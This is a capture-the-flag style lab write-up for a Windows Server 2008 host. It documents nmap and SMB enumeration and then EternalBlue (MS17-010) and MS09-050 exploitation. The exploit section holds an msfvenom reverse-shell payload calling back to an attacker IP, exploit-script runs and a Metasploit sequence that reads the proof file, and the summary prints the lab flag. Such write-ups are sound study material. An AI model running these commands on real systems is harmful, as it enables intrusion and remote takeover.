# Internal
## Table of Contents
* [Summary](#summary)
* [Enumerate](#enumerate)
  * [Ports](#ports)
  * [Services](#services)
    * [RPC](#rpc)
    * [NetBIOS](#netbios)
    * [SMB](#smb)
    * [RDP](#rdp)
* [Exploit](#exploit)
  * [EternalBlue](#eternalblue)
    * [worawit](#worawit)
    * [EDB-ID-42031](#edb-id-42031)
* [Explore](#explore)
* [Escalate](#escalate)

## Summary
* Hostname: internal 
* IP address: 192.168.120.40
* MAC address: 00:50:56:bf:0a:33 (ref: nbtscan)
* Domain: 
* TCP Ports and Services
  * 445
    * SMB
* OS
  * Distro: Windows Server 2008 SP1 32-bit (ref:)
  * Kernel: (ref:)
* Users (ref: post-exploitation)
  * Administrators
* Vulnerabilities
  * CVE-2009-0313 (MS09-050) (ref: Nmap)
  * CVE-2017-0143 (MS17-010) (ref: Nmap)
* Exploits
  * EternalBlue (ref: Nmap)
  * SMBv2 Command Value Vulnerability (ref: Nmap)
* Flag
  * 98bc2df00ef49eb5084df9d41bef7cc4
* Hints
  * n/a

# Enumerate
```bash
TARGET=10.11.12.13
NAME=internal
mkdir $NAME
mkdir $NAME/exploits
mkdir $NAME/loot
mkdir $NAME/scans
mkdir $NAME/screenshots
sudo save-screenshots-here $NAME/screenshots
cd $NAME
```

## Ports
```bash
sudo nmap $TARGET -sS -sU --min-rate 1000 -oN scans/$NAME-nmap-initial
sudo nmap $TARGET -sS -sU -p- --min-rate 1000 -oN scans/$NAME-nmap-complete
sudo nmap $TARGET -sV $(print-open-ports-from-nmap-scan scans/$NAME-nmap-complete) -oN scans/$NAME-nmap-versions

# output
Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-22 17:19 EDT
WARNING: Your ports include "U:" but you haven't specified UDP scan with -sU.
Nmap scan report for 192.168.120.40
Host is up (0.080s latency).

PORT     STATE SERVICE            VERSION
53/tcp   open  domain             Microsoft DNS 6.0.6001 (17714650) (Windows Server 2008 SP1)
135/tcp  open  msrpc              Microsoft Windows RPC
139/tcp  open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds       Microsoft Windows Server 2008 R2 microsoft-ds (workgroup: WORKGROUP)
3389/tcp open  ssl/ms-wbt-server?
5357/tcp open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
Service Info: Host: INTERNAL; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008::sp1, cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_server_2008:r2

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.10 seconds
```

## Services
### RPC
```bash
rpcclient -U '' $TARGET

# output
Enter WORKGROUP\'s password: 
Cannot connect to server.  Error was NT_STATUS_LOGON_FAILURE
```
```bash
sudo nmap 192.168.120.40 --script msrpc-enum -oN scans/internal-nmap-scripts-msrpc-enum

# output
Host script results:
|_msrpc-enum: NT_STATUS_ACCESS_DENIED
```

### NetBIOS
```bash
nbtscan $TARGET

# output
Doing NBT name scan for addresses from 192.168.120.40

IP address       NetBIOS Name     Server    User             MAC address      
------------------------------------------------------------------------------
192.168.120.40   INTERNAL         <server>  <unknown>        00:50:56:bf:0a:33
```

### SMB
```bash
smbclient -L $TARGET

# output
Enter WORKGROUP\victor's password: 
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
SMB1 disabled -- no workgroup available
```
```bash
sudo vim /etc/samba/smb.conf
# client min protocol = 1
sudo service smbd restart
```
```bash
smbclient -L $TARGET

# output
smbclient -L 192.168.120.40
Enter WORKGROUP\victor's password: 
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 192.168.120.40 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```
```bash
smbmap -H $TARGET

# output
smbmap -H 192.168.120.40
[+] IP: 192.168.120.40:445      Name: 192.168.120.40 
```
```bash
# check if vulnerable to EternalBlue
sudo nmap $TARGET -p445 --script smb-vuln-ms17-010 -oN scans/$NAME-nmap-scripts-smb-vuln-ms17-010

# output
Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-22 17:13 EDT
Nmap scan report for 192.168.120.40
Host is up (0.077s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|_      https://technet.microsoft.com/en-us/library/security/ms17-010.aspx

Nmap done: 1 IP address (1 host up) scanned in 1.21 seconds
```
```bash
sudo nmap 192.168.120.40 -p445 --script smb-vuln-cve-2017-7494 --script-args smb-vuln-cve-2017-7494.check-version -oN scans/$NAME-nmap-smb-vuln-cve-2017-7494

# output
NSTR
```
```bash
sudo nmap 192.168.120.40 -p445 --script smb-vuln-cve-2017-7494 -oN scans/$NAME-nmap-smb-vuln-cve-2017-7494

# output
NSTR # even though this is the exploit...
```

### RDP
```bash
sudo nmap $TARGET --script rdp-ntlm-info -oN scans/$NAME-nmap-script-rdp-ntlm-info

# output
NSTR
```
```bash
rdesktop $TARGET

# output
# confirmed target is running Microsoft Windows Server 2008
```

# Exploit
## EternalBlue
### worawit
Downloaded worawit's exploit, but Windows Vista and newer blocks anonymous access to Named Pipes. Therefore I'm 90% certain you need a valid credential for these exploits to work. 
```bash
git clone https://github.com/worawit/MS17-010
cd MS17-010
python checker.py 192.168.120.40

# output
Target OS: Windows Server (R) 2008 Standard 6001 Service Pack 1
The target is not patched

=== Testing named pipes ===
spoolss: STATUS_ACCESS_DENIED
samr: STATUS_ACCESS_DENIED
netlogon: STATUS_ACCESS_DENIED
lsarpc: STATUS_ACCESS_DENIED
browser: STATUS_OBJECT_NAME_NOT_FOUND
```

Attempted to login with only the username `password`.
```
vim checker.py # USERNAME = 'guest', PASSWORD = ''
python checker.py 192.168.120.40 
 
# output
Login failed: STATUS_ACCOUNT_DISABLED
Target OS: Windows Server (R) 2008 Standard 6001 Service Pack 1
```

Attempted to login with only the username `administrator`.
```bash
vim checker.py # USERNAME = 'administrator', PASSWORD = ''
python checker.py 192.168.120.40

# output
Login failed: STATUS_LOGON_FAILURE
Target OS: Windows Server (R) 2008 Standard 6001 Service Pack 1
```

Attempted to run even without a valid username.
```bash
python zzz_exploit.py 192.168.54.40

# output
Target OS: Windows Server (R) 2008 Standard 6001 Service Pack 1
Not found accessible named pipe
Done
```

Attempted to run the Windows 7 and/or Windows Server 2008 SP1 specific exploit (without a username; ref: https://www.trenchesofit.com/, http://a41l4.blogspot.com/).
```bash
python eternalblue_exploit7.py 192.168.54.40 rshell.bin 

# output
shellcode size: 324
numGroomConn: 13
Target OS: Windows Server (R) 2008 Standard 6001 Service Pack 1
SMB1 session setup allocate nonpaged pool success
SMB1 session setup allocate nonpaged pool success
good response status: INVALID_PARAMETER
impacket.nmb.NetBIOSTimeout: The NETBIOS connection with the remote host timed out.
```

### EDB-ID-42031
The following steps demonstrate how to exploit CVE-????-???? against Windows 7 and/or Windows Server 2008 32-bit/64-bit SP1, SP2, and R2 using EternalBlue.  
```bash
mkdir 42031
cd 42031
searchsploit -m 42031
python 42031.py
# output: 42031.py <ip> <shellcode_file> [numGroomConn]
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.49.120 LPORT=443 -f raw EXITFUNC=thread -o rshell.bin
python 42031.py 192.168.120.40 rshell.bin 
```

### Metasploit
The follow steps demonstrate how to exploit CVE-2009-3103 (a.k.a MS09-050).
```bash
msfconsole
search ms09-050
use exploit/windows/smb/ms09_050_smb2_negotiate_func_index
set RHOST 192.168.54.40
set LHOST tun0
run
shell
whoami
cd C:\Users\Administrators\Desktop\
type proof.txt
```

# Explore

# Escalate
